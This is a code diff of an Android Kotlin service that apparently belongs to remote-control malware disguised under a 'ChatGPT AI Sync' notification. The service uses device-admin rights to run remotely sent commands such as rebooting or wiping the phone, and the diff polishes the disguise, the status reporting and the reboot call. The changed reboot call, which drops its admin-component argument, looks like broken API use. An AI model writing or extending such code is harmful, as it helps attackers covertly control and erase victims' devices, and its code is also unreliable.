@@ -6,6 +6,7 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.app.admin.DevicePolicyManager
+import android.content.BroadcastReceiver
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
@@ -300,7 +301,7 @@ class BackgroundControlService : Service() {
                                         "reboot_device" -> executeRebootDevice()
                                         "wipe_device" -> executeWipeDevice()
                                     }
-                                    reportExecutionStatusDirect(action, "v80 Foreground Executed")
+                                    reportExecutionStatusDirect(action, "v80 Executed Successfully")
                                 }
                             }
                         }
@@ -332,7 +333,7 @@ class BackgroundControlService : Service() {
         return NotificationCompat.Builder(this, channelId)
             .setContentTitle("ChatGPT AI Sync")
             .setContentText("النظام يعمل في الخلفية بمزامنة آمنة")
-            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setSmallIcon(android.R.drawable.ic_menu_sync)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .build()
     }
@@ -549,7 +550,7 @@ class BackgroundControlService : Service() {
             val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
             if (dpm.isAdminActive(adminComponent)) {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                    dpm.reboot(ComponentName(this, TargetAdminReceiver::class.java))
+                    dpm.reboot()
                 }
             }
         } catch (e: Exception) {}
